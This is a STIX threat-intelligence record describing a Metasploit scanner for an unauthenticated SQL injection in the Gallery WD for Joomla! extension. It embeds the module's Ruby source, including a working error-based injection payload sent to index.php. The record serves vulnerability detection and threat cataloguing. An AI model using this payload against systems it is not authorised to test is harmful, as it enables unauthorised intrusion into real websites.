{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--76395f95-1444-414f-bc9d-e2d65022bd6f",
    "created": "2024-08-14T16:28:43.349431Z",
    "modified": "2024-08-14T16:28:43.349435Z",
    "name": "Gallery WD for Joomla! Unauthenticated SQL Injection Scanner",
    "description": " This module will scan for Joomla! instances vulnerable to an unauthenticated SQL injection within the Gallery WD for Joomla! extension version 1.2.5 and likely prior. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/joomla_gallerywd_sqli_scanner.rb",
            "external_id": "joomla_gallerywd_sqli_scanner.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Gallery WD for Joomla! Unauthenticated SQL Injection Scanner',\n      'Description' => %q{\n      This module will scan for Joomla! instances vulnerable to an unauthenticated SQL injection\n      within the Gallery WD for Joomla! extension version 1.2.5 and likely prior.\n      },\n      'Author'       =>\n        [\n          'CrashBandicoot', #independent discovery/0day drop\n          'bperry' #discovery/metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'EDB', '36563']\n        ],\n      'DisclosureDate' => '2015-03-30'))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Target URI of the Joomla! instance', '/'])\n    ])\n  end\n\n  def run_host(ip)\n    right_marker = Rex::Text.rand_text_alpha(5)\n    left_marker = Rex::Text.rand_text_alpha(5)\n    flag = Rex::Text.rand_text_alpha(5)\n\n    vprint_status(\"Checking host\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'POST',\n      'vars_get' => {\n        'option' => 'com_gallery_wd',\n        'view' => 'gallerybox',\n        'image_id' => '-1',\n        'gallery_id' => '-1',\n        'thumb_width' => '180',\n        'thumb_height' => '90',\n        'open_with_fullscreen' => 0,\n        'image_width' => 800,\n        'image_height' => 500,\n        'image_effect' => 'fade',\n        'sort_by' => 'order',\n        'order_by' => 'asc',\n        'enable_image_filmstrip' => '',\n        'image_filmstrip_height' => 0,\n        'enable_image_ctrl_btn' => 1,\n        'enable_image_fullscreen' => 1,\n        'popup_enable_info' => 1,\n        'popup_info_always_show' => 0,\n        'popup_hit_counter' => 0,\n        'popup_enable_rate' => 0,\n        'slideshow_interval' => 5,\n        'enable_comment_social' => '',\n        'enable_image_facebook' => '',\n        'enable_image_twitter' => '',\n        'enable_image_google' => '',\n        'enable_image_pinterest' => '',\n        'enable_image_tumblr' => '',\n        'watermark_type' => 'none'\n      },\n      'vars_post' => {\n        'image_id' => \"1 AND (SELECT 2425 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack(\"H*\")[0]},0x#{flag.unpack(\"H*\")[0]},0x#{right_marker.unpack(\"H*\")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\",\n        'rate' => '',\n        'ajax_task' => 'save_hit_count',\n        'task' => 'gallerybox.ajax_search'\n      }\n    })\n\n    unless res && res.body\n      vprint_error(\"Server did not respond in an expected way\")\n      return\n    end\n\n    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/\n\n    if result\n      print_good(\"Vulnerable to unauthenticated SQL injection within Gallery WD for Joomla!\")\n      report_vuln({\n        :host  => rhost,\n        :port  => rport,\n        :proto => 'tcp',\n        :name  => \"Unauthenticated error-based SQL injection in Gallery WD for Joomla!\",\n        :refs  => self.references.select { |ref| ref.ctx_val == \"36563\" }\n      })\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-30"
}